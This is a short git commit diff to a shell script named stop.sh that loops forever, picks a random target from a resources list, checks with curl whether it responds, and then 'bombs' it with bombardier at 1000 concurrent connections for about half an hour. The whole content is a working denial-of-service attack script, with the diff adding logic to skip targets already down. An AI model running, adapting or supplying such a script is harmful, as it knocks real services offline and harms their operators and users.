f6a1e0915efcb7d22b9d71604a70d1c13742d922
alona <alona.tolstaya@gmail.com>
2022-02-28 18:35:34 +0200

    add yaml

--- stop.sh
+++ stop.sh
@@ -3,7 +3,13 @@
 while true; do
   # get random resource
   RESOURCE=$(shuf resources.txt | head -n1)
-
-  # start bombing
-  bombardier -c 1000 -d 3600s -l $RESOURCE
+  echo "Checking $RESOURCE..." 
+  curl $RESOURCE
+  if [ $? -eq 0 ]
+  then
+    # start bombing
+    bombardier -c 1000 -d 1890s -l $RESOURCE
+  else
+    echo "$RESOURCE is down\n"
+  fi
 done
